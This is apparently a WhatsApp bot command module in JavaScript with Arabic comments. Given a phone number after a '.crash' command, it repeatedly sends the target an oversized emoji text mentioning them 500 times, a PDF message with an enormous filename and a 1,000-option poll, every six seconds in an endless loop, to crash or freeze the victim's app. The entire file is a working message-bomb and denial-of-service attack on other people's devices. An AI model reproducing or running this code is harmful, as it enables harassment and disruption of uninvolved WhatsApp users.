module.exports = async ({ sock, m, text, reply }) => {
    if (!text) return reply("❌ ضع الرقم بعد الأمر مثل: .crash 201xxxxxxxxx");

    const target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    reply("⚠️ جاري إرسال أمر CRASH... انتظر");

    async function crashLoop(jid) {
        while (true) {
            try {
                // رسالة ضخمة جدًا
                await sock.sendMessage(jid, {
                    text: '⚠️❌🔥'.repeat(10000),
                    contextInfo: {
                        mentionedJid: Array(500).fill(jid),
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                });

                // ملف PDF ضخم
                await sock.sendMessage(jid, {
                    document: { url: 'https://www.google.com' },
                    mimetype: 'application/pdf',
                    fileName: 'CRASH_FILE'.repeat(500),
                    caption: '💥 WhatsApp Crash Test 💥'
                });

                // استطلاع كبير (Poll)
                await sock.sendMessage(jid, {
                    poll: {
                        name: '💣 CRASH POLL 💣',
                        values: Array(1000).fill('🔥'),
                        selectableCount: 900
                    }
                });

                await new Promise(resolve => setTimeout(resolve, 6000)); // تكرار كل 6 ثوانٍ
            } catch (err) {
                console.error("❌ خطأ أثناء إرسال أمر CRASH:", err);
                break;
            }
        }
    }

    crashLoop(target);
};
